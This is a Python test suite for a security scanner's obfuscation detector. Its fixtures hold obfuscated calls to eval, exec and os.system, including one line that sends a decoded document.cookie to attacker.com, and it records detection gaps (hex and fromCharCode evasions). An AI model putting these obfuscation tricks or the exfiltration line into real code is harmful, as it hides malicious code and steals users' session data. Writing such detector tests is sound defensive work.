"""
Tests for Fase 42 ObfuscationDetector.

Tests cover obfuscation detection rules:
- OBF-CONCAT: String concatenation building dangerous function names
- OBF-ENCODE: Base64/hex encoding hiding dangerous calls
- OBF-UNICODE: Unicode escape sequences forming dangerous identifiers
- OBF-CHARCODE: Character code arithmetic building strings
- OBF-ENTROPY: High Shannon entropy in identifiers (obfuscated code)
"""

import pytest
from pathlib import Path

from app.services.security_scanner.adapters.obfuscation_detector import (
    ObfuscationDetector,
    ObfuscationRule,
    ALL_OBFUSCATION_RULES,
    CONCAT_RULES,
    ENCODE_RULES,
    UNICODE_RULES,
    CHARCODE_RULES,
    ENTROPY_RULES,
    create_obfuscation_detector,
)
from app.services.security_scanner.models.findings import (
    ScannerType,
    Severity,
)


# =============================================================================
# SCANNER BASICS
# =============================================================================


class TestObfuscationDetectorBasics:
    """Tests for basic scanner properties."""

    def test_scanner_type(self):
        """Should return correct scanner type."""
        scanner = ObfuscationDetector()
        assert scanner.scanner_type == ScannerType.OBFUSCATION

    def test_is_always_available(self):
        """Custom scanner should always be available."""
        scanner = ObfuscationDetector()
        assert scanner.is_available() is True

    def test_scanner_version(self):
        """Should return version string."""
        scanner = ObfuscationDetector()
        assert scanner.get_scanner_version() == "1.0.0"

    def test_has_expected_rules(self):
        """Should have expected number of obfuscation detection rules."""
        assert len(ALL_OBFUSCATION_RULES) >= 10

    def test_supported_languages(self):
        """Should support expected languages."""
        scanner = ObfuscationDetector()
        languages = scanner.supported_languages
        assert "javascript" in languages
        assert "typescript" in languages
        assert "python" in languages
        assert "java" in languages

    def test_supported_extensions(self):
        """Should support expected file extensions."""
        scanner = ObfuscationDetector()
        extensions = scanner.supported_extensions
        assert ".js" in extensions
        assert ".ts" in extensions
        assert ".py" in extensions
        assert ".java" in extensions
        assert ".jsx" in extensions
        assert ".tsx" in extensions

    def test_factory_function(self):
        """Factory function should create scanner instance."""
        scanner = create_obfuscation_detector()
        assert isinstance(scanner, ObfuscationDetector)

    def test_rules_have_cwe_ids(self):
        """All rules should have CWE IDs."""
        for rule in ALL_OBFUSCATION_RULES:
            assert len(rule.cwe_ids) > 0, f"Rule {rule.id} has no CWE IDs"

    def test_rules_have_fix_suggestions(self):
        """All rules should have fix suggestions."""
        for rule in ALL_OBFUSCATION_RULES:
            assert rule.fix_suggestion, f"Rule {rule.id} has no fix suggestion"

    def test_covers_target_cwes(self):
        """Should cover the target CWEs for Fase 42 obfuscation."""
        cwe_coverage = set()
        for rule in ALL_OBFUSCATION_RULES:
            cwe_coverage.update(rule.cwe_ids)
        assert "CWE-94" in cwe_coverage, "CWE-94 (Code Injection) not covered"
        assert "CWE-506" in cwe_coverage, "CWE-506 (Embedded Malicious Code) not covered"

    def test_all_rules_have_categories(self):
        """All rules should have a valid category string."""
        valid_categories = {
            "obfuscation_concat",
            "obfuscation_encode",
            "obfuscation_unicode",
            "obfuscation_charcode",
            "obfuscation_entropy",
        }
        for rule in ALL_OBFUSCATION_RULES:
            assert rule.category in valid_categories, (
                f"Rule {rule.id} has unexpected category: {rule.category}"
            )

    def test_rules_summary(self):
        """Should return a complete rules summary."""
        scanner = ObfuscationDetector()
        summary = scanner.get_rules_summary()
        assert summary["total_rules"] == len(ALL_OBFUSCATION_RULES)
        assert "rules_by_category" in summary
        assert "cwe_coverage" in summary
        assert "supported_languages" in summary

    def test_rules_summary_has_category_descriptions(self):
        """Should include category descriptions in rules summary."""
        scanner = ObfuscationDetector()
        summary = scanner.get_rules_summary()
        descs = summary["category_descriptions"]
        assert "obfuscation_concat" in descs
        assert "obfuscation_encode" in descs
        assert "obfuscation_unicode" in descs
        assert "obfuscation_charcode" in descs
        assert "obfuscation_entropy" in descs

    def test_rules_summary_has_confidence_levels(self):
        """Should include confidence levels in rules summary."""
        scanner = ObfuscationDetector()
        summary = scanner.get_rules_summary()
        assert "confidence_levels" in summary
        assert "obfuscation_concat" in summary["confidence_levels"]

    def test_concat_rules_exist(self):
        """Should have concat rules."""
        assert len(CONCAT_RULES) >= 3

    def test_encode_rules_exist(self):
        """Should have encode rules."""
        assert len(ENCODE_RULES) >= 3

    def test_unicode_rules_exist(self):
        """Should have unicode rules."""
        assert len(UNICODE_RULES) >= 2

    def test_charcode_rules_exist(self):
        """Should have charcode rules."""
        assert len(CHARCODE_RULES) >= 2

    def test_entropy_rules_exist(self):
        """Should have entropy rules."""
        assert len(ENTROPY_RULES) >= 2

    def test_all_rules_have_patterns(self):
        """All rules should have at least one language pattern."""
        for rule in ALL_OBFUSCATION_RULES:
            assert len(rule.patterns) > 0, f"Rule {rule.id} has no patterns"

    def test_all_rules_have_confidence(self):
        """All rules should have a valid confidence value."""
        for rule in ALL_OBFUSCATION_RULES:
            assert 0.0 <= rule.confidence <= 1.0, (
                f"Rule {rule.id} has invalid confidence: {rule.confidence}"
            )


# =============================================================================
# OBF-CONCAT: STRING CONCATENATION OBFUSCATION
# =============================================================================


class TestStringConcatObfuscation:
    """Tests for string concatenation obfuscation detection (OBF-CONCAT)."""

    @pytest.mark.asyncio
    async def test_detect_js_eval_concat(self, tmp_path):
        """Should detect 'ev' + 'al' concatenation in JavaScript."""
        test_file = tmp_path / "obfuscated.js"
        test_file.write_text('''
var fn = "ev" + "al";
window[fn]("alert(1)");
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) >= 1
        finding = next((f for f in result.findings if "CONCAT" in f.rule_id), None)
        assert finding is not None
        assert "CWE-94" in finding.cwe_ids

    @pytest.mark.asyncio
    async def test_detect_js_exec_concat(self, tmp_path):
        """Should detect 'ex' + 'ec' concatenation in JavaScript."""
        test_file = tmp_path / "obfuscated.js"
        test_file.write_text('''
var cmd = "ex" + "ec";
window[cmd](payload);
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) >= 1
        finding = next((f for f in result.findings if "CONCAT" in f.rule_id), None)
        assert finding is not None

    @pytest.mark.asyncio
    async def test_detect_js_settimeout_concat(self, tmp_path):
        """Should detect 'set' + 'Timeout' concatenation in JavaScript."""
        test_file = tmp_path / "obfuscated.js"
        test_file.write_text('''
var timer = "set" + "Timeout";
window[timer](code, 0);
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) >= 1
        finding = next((f for f in result.findings if "OBF-CONCAT-001" == f.rule_id), None)
        assert finding is not None

    @pytest.mark.asyncio
    async def test_detect_js_setinterval_concat(self, tmp_path):
        """Should detect 'set' + 'Interval' concatenation in JavaScript."""
        test_file = tmp_path / "obfuscated.js"
        test_file.write_text('''
var loop = "set" + "Interval";
window[loop](code, 1000);
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) >= 1
        finding = next((f for f in result.findings if "OBF-CONCAT-001" == f.rule_id), None)
        assert finding is not None

    @pytest.mark.asyncio
    async def test_detect_js_innerhtml_concat(self, tmp_path):
        """Should detect 'inner' + 'HTML' concatenation in JavaScript."""
        test_file = tmp_path / "obfuscated.js"
        test_file.write_text('''
var prop = "inner" + "HTML";
el[prop] = data;
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) >= 1

    @pytest.mark.asyncio
    async def test_detect_js_function_concat(self, tmp_path):
        """Should detect 'Fun' + 'ction' concatenation in JavaScript."""
        test_file = tmp_path / "obfuscated.js"
        test_file.write_text('''
var ctor = "Fun" + "ction";
new window[ctor]("return this")();
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) >= 1
        finding = next((f for f in result.findings if "OBF-CONCAT-001" == f.rule_id), None)
        assert finding is not None

    @pytest.mark.asyncio
    async def test_detect_python_eval_concat(self, tmp_path):
        """Should detect Python getattr with concatenated eval."""
        test_file = tmp_path / "obfuscated.py"
        test_file.write_text('''
import builtins
fn = getattr(builtins, "ev" + "al")
fn("print('pwned')")
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) >= 1
        finding = next((f for f in result.findings if "OBF-CONCAT-002" == f.rule_id), None)
        assert finding is not None
        assert "CWE-94" in finding.cwe_ids

    @pytest.mark.asyncio
    async def test_detect_python_system_concat(self, tmp_path):
        """Should detect Python 'sy' + 'stem' concatenation."""
        test_file = tmp_path / "obfuscated.py"
        test_file.write_text('''
import os
fn_name = "sy" + "stem"
getattr(os, fn_name)("whoami")
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) >= 1
        finding = next((f for f in result.findings if "CONCAT" in f.rule_id), None)
        assert finding is not None

    @pytest.mark.asyncio
    async def test_detect_python_popen_concat(self, tmp_path):
        """Should detect Python 'po' + 'pen' concatenation."""
        test_file = tmp_path / "obfuscated.py"
        test_file.write_text('''
import os
fn_name = "po" + "pen"
getattr(os, fn_name)("ls -la")
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) >= 1
        finding = next((f for f in result.findings if "OBF-CONCAT-002" == f.rule_id), None)
        assert finding is not None

    @pytest.mark.asyncio
    async def test_detect_js_array_join(self, tmp_path):
        """Should detect array join building dangerous function name."""
        test_file = tmp_path / "obfuscated.js"
        test_file.write_text('''
var fn = ['e','v','a','l'].join('');
window[fn](code);
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) >= 1
        finding = next((f for f in result.findings if "OBF-CONCAT-003" == f.rule_id), None)
        assert finding is not None

    @pytest.mark.asyncio
    async def test_detect_python_join_chars(self, tmp_path):
        """Should detect Python join building dangerous function name."""
        test_file = tmp_path / "obfuscated.py"
        test_file.write_text('''
fn = ''.join(['e','v','a','l'])
__builtins__[fn]("print(1)")
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) >= 1
        finding = next((f for f in result.findings if "OBF-CONCAT-003" == f.rule_id), None)
        assert finding is not None

    @pytest.mark.asyncio
    async def test_detect_ts_eval_concat(self, tmp_path):
        """Should detect 'ev' + 'al' concatenation in TypeScript."""
        test_file = tmp_path / "obfuscated.ts"
        test_file.write_text('''
const fn: string = "ev" + "al";
(window as any)[fn]("payload");
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) >= 1
        finding = next((f for f in result.findings if "OBF-CONCAT-001" == f.rule_id), None)
        assert finding is not None

    @pytest.mark.asyncio
    async def test_no_false_positive_normal_concat_js(self, tmp_path):
        """Should NOT flag normal string concatenation in JavaScript."""
        test_file = tmp_path / "safe.js"
        test_file.write_text('''
var greeting = "Hello" + " " + "World";
var path = "/api/" + "users";
var msg = firstName + " " + lastName;
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        concat_findings = [f for f in result.findings if "CONCAT" in f.rule_id]
        assert len(concat_findings) == 0

    @pytest.mark.asyncio
    async def test_no_false_positive_normal_concat_python(self, tmp_path):
        """Should NOT flag normal string concatenation in Python."""
        test_file = tmp_path / "safe.py"
        test_file.write_text('''
greeting = "Hello" + " " + "World"
path = "/api/" + "users"
full_name = first_name + " " + last_name
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        concat_findings = [f for f in result.findings if "CONCAT" in f.rule_id]
        assert len(concat_findings) == 0


# =============================================================================
# OBF-ENCODE: BASE64 AND HEX ENCODING OBFUSCATION
# =============================================================================


class TestEncodingObfuscation:
    """Tests for encoding-based obfuscation detection (OBF-ENCODE)."""

    @pytest.mark.asyncio
    async def test_detect_js_atob_base64(self, tmp_path):
        """Should detect atob() with base64 encoded string in JavaScript."""
        test_file = tmp_path / "obfuscated.js"
        test_file.write_text('''
var fn = atob("ZXZhbA==");
window[fn]("alert(1)");
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) >= 1
        finding = next((f for f in result.findings if "OBF-ENCODE-001" == f.rule_id), None)
        assert finding is not None
        assert "CWE-94" in finding.cwe_ids

    @pytest.mark.asyncio
    async def test_detect_ts_atob_base64(self, tmp_path):
        """Should detect atob() in TypeScript."""
        test_file = tmp_path / "obfuscated.ts"
        test_file.write_text('''
const decoded = atob("ZXhlYw==");
(window as any)[decoded](payload);
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) >= 1
        finding = next((f for f in result.findings if "ENCODE" in f.rule_id), None)
        assert finding is not None

    @pytest.mark.asyncio
    async def test_detect_js_atob_long_payload(self, tmp_path):
        """Should detect atob() with a longer base64 payload."""
        test_file = tmp_path / "obfuscated.js"
        test_file.write_text('''
var payload = atob("ZG9jdW1lbnQuY29va2ll");
fetch("https://attacker.com/?d=" + payload);
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) >= 1
        finding = next((f for f in result.findings if "OBF-ENCODE-001" == f.rule_id), None)
        assert finding is not None

    @pytest.mark.asyncio
    async def test_detect_python_base64_decode(self, tmp_path):
        """Should detect base64.b64decode in Python."""
        test_file = tmp_path / "obfuscated.py"
        test_file.write_text('''
import base64
payload = base64.b64decode("ZXZhbChfX2ltcG9ydF9fKCdvcycpLnN5c3RlbSgnd2hvYW1pJykp")
exec(payload)
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) >= 1
        finding = next((f for f in result.findings if "OBF-ENCODE-002" == f.rule_id), None)
        assert finding is not None

    @pytest.mark.asyncio
    async def test_detect_python_b64decode_with_b_prefix(self, tmp_path):
        """Should detect base64.b64decode with b'' string prefix."""
        test_file = tmp_path / "obfuscated.py"
        test_file.write_text('''
import base64
code = base64.b64decode(b"cHJpbnQoJ2hlbGxvJyk=")
exec(code)
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) >= 1
        finding = next((f for f in result.findings if "ENCODE" in f.rule_id), None)
        assert finding is not None

    @pytest.mark.asyncio
    async def test_detect_python_decodebytes(self, tmp_path):
        """Should detect base64.decodebytes in Python."""
        test_file = tmp_path / "obfuscated.py"
        test_file.write_text('''
import base64
code = base64.decodebytes(b"ZXZhbChwcmludCgxKSk=")
exec(code)
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) >= 1
        finding = next((f for f in result.findings if "OBF-ENCODE-002" == f.rule_id), None)
        assert finding is not None

    @pytest.mark.asyncio
    async def test_detect_js_hex_escape_sequence(self, tmp_path):
        """Should detect hex escape sequences in JavaScript."""
        test_file = tmp_path / "obfuscated.js"
        test_file.write_text(r'''
var fn = "\x65\x76\x61\x6c";
window[fn]("alert(1)");
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) >= 1
        finding = next((f for f in result.findings if "OBF-ENCODE-003" == f.rule_id), None)
        assert finding is not None

    @pytest.mark.asyncio
    async def test_detect_python_hex_escape_sequence(self, tmp_path):
        """Should detect hex escape sequences in Python."""
        test_file = tmp_path / "obfuscated.py"
        test_file.write_text(r'''
fn = "\x65\x76\x61\x6c"
getattr(__builtins__, fn)("print(1)")
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) >= 1

    @pytest.mark.asyncio
    async def test_detect_java_hex_escape_sequence(self, tmp_path):
        """Should detect hex escape sequences in Java."""
        test_file = tmp_path / "Obfuscated.java"
        test_file.write_text(r'''
public class Obfuscated {
    String cmd = "\x52\x75\x6e\x74\x69\x6d\x65";
}
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) >= 1
        finding = next((f for f in result.findings if "OBF-ENCODE-003" == f.rule_id), None)
        assert finding is not None

    @pytest.mark.asyncio
    async def test_severity_elevated_for_dangerous_decode(self, tmp_path):
        """Should elevate severity to HIGH when base64 decodes to dangerous function."""
        test_file = tmp_path / "dangerous.js"
        # "ZXZhbA==" decodes to "eval"
        test_file.write_text('''
var fn = atob("ZXZhbA==");
window[fn]("payload");
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) >= 1
        finding = next((f for f in result.findings if "ENCODE" in f.rule_id), None)
        assert finding is not None
        assert finding.severity == Severity.HIGH

    @pytest.mark.asyncio
    async def test_confidence_boosted_for_dangerous_decode(self, tmp_path):
        """Should boost confidence when base64 decodes to dangerous function."""
        test_file = tmp_path / "dangerous.js"
        # "ZXZhbA==" decodes to "eval"
        test_file.write_text('''
var fn = atob("ZXZhbA==");
window[fn]("payload");
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) >= 1
        finding = next((f for f in result.findings if "ENCODE" in f.rule_id), None)
        assert finding is not None
        # Base confidence is 0.6, should be boosted to 0.8 for dangerous decode
        assert finding.confidence >= 0.7

    @pytest.mark.asyncio
    async def test_buffer_from_hex_triggers_fp_on_hex_keyword(self, tmp_path):
        """Buffer.from with 'hex' argument triggers false positive filter.

        The OBF-ENCODE-003 false positive pattern '(?:color|colour|rgb|hex|0x)'
        matches the literal 'hex' keyword in 'Buffer.from(..., "hex")', causing
        the finding to be filtered as a false positive. This is a known
        limitation of the current false positive patterns.
        """
        test_file = tmp_path / "obfuscated.js"
        test_file.write_text('''
var fn = Buffer.from("6576616c", "hex").toString();
global[fn](code);
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        # The 'hex' keyword in context triggers FP filter
        encode_findings = [f for f in result.findings if "ENCODE" in f.rule_id]
        assert len(encode_findings) == 0

    @pytest.mark.asyncio
    async def test_bytes_fromhex_triggers_fp_on_hex_keyword(self, tmp_path):
        """bytes.fromhex triggers false positive filter due to 'hex' in context.

        Same limitation as Buffer.from: the word 'hex' appears in
        'bytes.fromhex(...)' context and matches the FP pattern for hex/color.
        """
        test_file = tmp_path / "obfuscated.py"
        test_file.write_text('''
fn = bytes.fromhex("6576616c").decode()
__builtins__[fn]("print(1)")
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        # The 'hex' keyword in context triggers FP filter
        encode_findings = [f for f in result.findings if "ENCODE" in f.rule_id]
        assert len(encode_findings) == 0

    @pytest.mark.asyncio
    async def test_no_false_positive_legitimate_base64_python(self, tmp_path):
        """Should NOT flag legitimate base64 usage for data encoding."""
        test_file = tmp_path / "safe.py"
        test_file.write_text('''
import base64

# Legitimate: encoding image data
image_data = open("photo.png", "rb").read()
encoded = base64.b64encode(image_data)
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        encode_findings = [f for f in result.findings if "ENCODE" in f.rule_id]
        assert len(encode_findings) == 0

    @pytest.mark.asyncio
    async def test_no_false_positive_normal_strings_js(self, tmp_path):
        """Should NOT flag normal string operations without encoded payloads."""
        test_file = tmp_path / "safe.js"
        test_file.write_text('''
const username = "john_doe";
const greeting = "Hello " + username;
console.log(greeting);
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        encode_findings = [f for f in result.findings if "ENCODE" in f.rule_id]
        assert len(encode_findings) == 0

    @pytest.mark.asyncio
    async def test_dangerous_decode_check_base64(self, tmp_path):
        """Should correctly identify base64-encoded dangerous function names."""
        scanner = ObfuscationDetector()
        # "ZXZhbA==" decodes to "eval"
        assert scanner._check_dangerous_decode("ZXZhbA==", "base64") is True
        # "aGVsbG8=" decodes to "hello" - not dangerous
        assert scanner._check_dangerous_decode("aGVsbG8=", "base64") is False

    @pytest.mark.asyncio
    async def test_dangerous_decode_check_hex(self, tmp_path):
        """Should correctly identify hex-encoded dangerous function names."""
        scanner = ObfuscationDetector()
        # "6576616c" decodes to "eval"
        assert scanner._check_dangerous_decode("6576616c", "hex") is True
        # "68656c6c6f" decodes to "hello" - not dangerous
        assert scanner._check_dangerous_decode("68656c6c6f", "hex") is False


# =============================================================================
# OBF-UNICODE: UNICODE ESCAPE SEQUENCE OBFUSCATION
# =============================================================================


class TestUnicodeObfuscation:
    """Tests for unicode escape sequence obfuscation detection (OBF-UNICODE)."""

    @pytest.mark.asyncio
    async def test_detect_js_unicode_eval(self, tmp_path):
        """Should detect unicode escape sequences forming 'eval' in JavaScript."""
        test_file = tmp_path / "obfuscated.js"
        test_file.write_text(r'''
var fn = "\u0065\u0076\u0061\u006c";
window[fn]("alert(1)");
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) >= 1
        finding = next((f for f in result.findings if "UNICODE" in f.rule_id), None)
        assert finding is not None
        assert "CWE-94" in finding.cwe_ids

    @pytest.mark.asyncio
    async def test_detect_ts_unicode_escapes(self, tmp_path):
        """Should detect unicode escape sequences in TypeScript."""
        test_file = tmp_path / "obfuscated.ts"
        test_file.write_text(r'''
const fn: string = "\u0065\u0078\u0065\u0063";
(window as any)[fn](payload);
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) >= 1
        finding = next((f for f in result.findings if "OBF-UNICODE-001" == f.rule_id), None)
        assert finding is not None

    @pytest.mark.asyncio
    async def test_detect_python_unicode_escapes(self, tmp_path):
        """Should detect unicode escape sequences in Python."""
        test_file = tmp_path / "obfuscated.py"
        test_file.write_text(r'''
fn = "\u0065\u0076\u0061\u006c"
getattr(__builtins__, fn)("print(1)")
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) >= 1
        finding = next((f for f in result.findings if "UNICODE" in f.rule_id), None)
        assert finding is not None

    @pytest.mark.asyncio
    async def test_detect_java_unicode_escapes(self, tmp_path):
        """Should detect unicode escape sequences in Java."""
        test_file = tmp_path / "Obfuscated.java"
        test_file.write_text(r'''
public class Obfuscated {
    public void run() {
        String fn = "\u0052\u0075\u006e\u0074\u0069\u006d\u0065";
        Runtime.getRuntime().exec("whoami");
    }
}
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) >= 1
        finding = next((f for f in result.findings if "UNICODE" in f.rule_id), None)
        assert finding is not None

    @pytest.mark.asyncio
    async def test_detect_long_unicode_sequence(self, tmp_path):
        """Should detect long unicode escape sequences (more than 4)."""
        test_file = tmp_path / "obfuscated.js"
        test_file.write_text(r'''
var fn = "\u0046\u0075\u006e\u0063\u0074\u0069\u006f\u006e";
new window[fn]("return this")();
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) >= 1

    @pytest.mark.asyncio
    async def test_fromcharcode_triggers_fp_on_charcode_keyword(self, tmp_path):
        """String.fromCharCode triggers false positive filter for OBF-UNICODE-002.

        The OBF-UNICODE-002 false positive pattern '(?:keyCode|charCode|...)'
        matches the 'CharCode' substring within 'String.fromCharCode(...)' itself,
        causing findings to be filtered. This is a known limitation.
        """
        test_file = tmp_path / "obfuscated.js"
        test_file.write_text('''
var fn = String.fromCharCode(101, 118, 97, 108);
window[fn]("alert(1)");
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        # The 'CharCode' in 'fromCharCode' triggers the keyboard FP pattern
        unicode002_findings = [
            f for f in result.findings if f.rule_id == "OBF-UNICODE-002"
        ]
        assert len(unicode002_findings) == 0

    @pytest.mark.asyncio
    async def test_no_false_positive_short_unicode(self, tmp_path):
        """Should NOT flag fewer than 4 consecutive unicode escapes."""
        test_file = tmp_path / "safe.js"
        test_file.write_text(r'''
// Only 2 unicode escapes - not suspicious
var arrow = "\u2192\u2193";
console.log(arrow);
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        unicode_findings = [f for f in result.findings if "UNICODE" in f.rule_id]
        assert len(unicode_findings) == 0

    @pytest.mark.asyncio
    async def test_no_false_positive_three_unicode(self, tmp_path):
        """Should NOT flag exactly 3 consecutive unicode escapes."""
        test_file = tmp_path / "safe.js"
        test_file.write_text(r'''
var symbols = "\u2190\u2191\u2192";
console.log(symbols);
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        unicode_findings = [f for f in result.findings if "UNICODE" in f.rule_id]
        assert len(unicode_findings) == 0


# =============================================================================
# OBF-ENTROPY: HIGH ENTROPY IDENTIFIER DETECTION
# =============================================================================


class TestEntropyDetection:
    """Tests for high entropy identifier detection (OBF-ENTROPY)."""

    @pytest.mark.asyncio
    async def test_detect_js_hex_identifier(self, tmp_path):
        """Should detect high entropy hex identifier in JavaScript."""
        test_file = tmp_path / "obfuscated.js"
        test_file.write_text('''
var _0x4a3f8b = function() { return true; };
var _0x5c2d9e = _0x4a3f8b();
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) >= 1
        finding = next((f for f in result.findings if "ENTROPY" in f.rule_id), None)
        assert finding is not None
        assert "CWE-506" in finding.cwe_ids

    @pytest.mark.asyncio
    async def test_detect_js_dollar_sign_obfuscated(self, tmp_path):
        """Should detect _$ prefixed obfuscated names in JavaScript."""
        test_file = tmp_path / "obfuscated.js"
        test_file.write_text('''
var _$Zq8xPm = "hidden";
let _$Yf7wRn = _$Zq8xPm;
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) >= 1
        finding = next((f for f in result.findings if "OBF-ENTROPY-001" == f.rule_id), None)
        assert finding is not None

    @pytest.mark.asyncio
    async def test_detect_js_short_prefix_hex_suffix(self, tmp_path):
        """Should detect short prefix with long hex suffix identifiers."""
        test_file = tmp_path / "obfuscated.js"
        test_file.write_text('''
const a1b2c3d4e5 = 42;
let x9f8e7d6c5 = a1b2c3d4e5;
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) >= 1
        finding = next((f for f in result.findings if "ENTROPY" in f.rule_id), None)
        assert finding is not None

    @pytest.mark.asyncio
    async def test_detect_python_obfuscated_class_OoIl(self, tmp_path):
        """Should detect O/o/I/l character class names in Python."""
        test_file = tmp_path / "obfuscated.py"
        test_file.write_text('''
class OoIlOoIl:
    pass

class IlIlIlIl:
    pass
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) >= 1
        finding = next((f for f in result.findings if "OBF-ENTROPY-002" == f.rule_id), None)
        assert finding is not None

    @pytest.mark.asyncio
    async def test_detect_python_hex_prefixed_def(self, tmp_path):
        """Should detect hex-prefixed function names in Python."""
        test_file = tmp_path / "obfuscated.py"
        test_file.write_text('''
def _x4f3a8b2c():
    return "hidden"

result = _x4f3a8b2c()
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) >= 1
        finding = next((f for f in result.findings if "ENTROPY" in f.rule_id), None)
        assert finding is not None

    @pytest.mark.asyncio
    async def test_detect_ts_obfuscated_identifiers(self, tmp_path):
        """Should detect obfuscated identifiers in TypeScript."""
        test_file = tmp_path / "obfuscated.ts"
        test_file.write_text('''
const _0xdeadbeef: number = 42;
function _0x1a2b3c4d(): void {
    console.log(_0xdeadbeef);
}
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) >= 1
        finding = next((f for f in result.findings if "ENTROPY" in f.rule_id), None)
        assert finding is not None

    @pytest.mark.asyncio
    async def test_detect_js_multiple_obfuscated_vars(self, tmp_path):
        """Should detect multiple obfuscated variable names."""
        test_file = tmp_path / "obfuscated.js"
        test_file.write_text('''
var _0xabcdef = 1;
let _0x123456 = 2;
const _0xfedcba = 3;
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        assert len(result.findings) >= 3
        entropy_findings = [f for f in result.findings if "ENTROPY" in f.rule_id]
        assert len(entropy_findings) >= 3

    @pytest.mark.asyncio
    async def test_no_false_positive_normal_identifiers_js(self, tmp_path):
        """Should NOT flag normal readable identifiers in JavaScript."""
        test_file = tmp_path / "safe.js"
        test_file.write_text('''
var userName = "alice";
let totalCount = 42;
const maxRetries = 3;
function calculateTotal(items) {
    return items.reduce((sum, item) => sum + item.price, 0);
}
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        entropy_findings = [f for f in result.findings if "ENTROPY" in f.rule_id]
        assert len(entropy_findings) == 0

    @pytest.mark.asyncio
    async def test_no_false_positive_normal_identifiers_python(self, tmp_path):
        """Should NOT flag normal PEP 8 identifiers in Python."""
        test_file = tmp_path / "safe.py"
        test_file.write_text('''
def calculate_total(items):
    total = 0
    for item in items:
        total += item.price
    return total

class UserManager:
    def get_user(self, user_id):
        pass
''')

        scanner = ObfuscationDetector()
        result = await scanner.scan(test_file)

        entropy_findings = [f for f in result.findings if "ENTROPY" in f.rule_id]
        assert len(entropy_findings) == 0

    def test_shannon_entropy_zero_for_repeated_chars(self):
        """Shannon entropy should be 0.0 for identical characters."""
        assert ObfuscationDetector._calculate_shannon_entropy("aaaa") == 0.0
        assert ObfuscationDetector._calculate_shannon_entropy("bbbbbb") == 0.0

    def test_shannon_entropy_zero_for_empty_string(self):
        """Shannon entropy should be 0.0 for empty string."""
        assert ObfuscationDetector._calculate_shannon_entropy("") == 0.0

    def test_shannon_entropy_high_for_diverse_chars(self):
        """Shannon entropy should be high for diverse character sets."""
        entropy = ObfuscationDetector._calculate_shannon_entropy("abcdefghij")
        assert entropy > 3.0

    def test_shannon_entropy_moderate_for_readable_identifiers(self):
        """Shannon entropy for readable identifiers should be moderate."""
        entropy = ObfuscationDetector._calculate_shannon_entropy("calculateTotal")
        # Readable identifiers typically have entropy < 4.0
        assert entropy < 4.0


# =============================================================================
# OBF-CHARCODE: CHARACTER CODE ARITHMETIC OBFUSCATION
# =============================================================================


class TestCharCodeObfuscation:
    """Tests for character code obfuscation detection (OBF-CHARCODE)."""

    @pytest.mark.asyncio
    async def test_fromcharcode_long_triggers_fp_on_charcode_keyword(self, tmp_path):
        """String.fromCharCode triggers false positive filter for OBF-CHARCODE-001.

        The OBF-CHARCODE-001 false positive pattern '(?:keyCode|charCode|...)'
        matches 'CharCode' within 'String.fromCharCode(...)' itself, causing
        all fromCharCode findings to be filtered. This is a known limitation
        of the current false positive patterns.
        """
